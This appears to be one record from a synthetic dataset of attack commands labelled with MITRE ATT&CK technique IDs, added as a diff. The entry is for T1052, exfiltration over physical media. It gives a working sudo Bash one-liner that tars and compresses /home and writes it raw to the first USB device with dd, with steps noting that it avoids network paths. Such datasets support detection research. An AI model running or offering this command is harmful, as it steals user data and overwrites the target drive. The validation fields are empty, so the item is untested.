@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UDEV=$(lsblk -o NAME,TRAN -nr | awk \"$2==\\\"usb\\\"{print \\\"/dev/\\\"$1}\" | head -n1); tar -cf - /home | gzip -9 | dd of=\"$UDEV\" bs=4M conv=fsync status=none'",
+  "explanation": "Directly writes a gzip-compressed tar of /home to the raw USB block device using dd, bypassing the filesystem to store data on physical media.",
+  "rationale_steps": [
+    "Locate the physical USB device node.",
+    "Create a tar stream of user data and compress with gzip.",
+    "Write the compressed stream directly to the USB device using dd.",
+    "Avoid network paths; operate entirely on local block devices."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-f65df58f",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
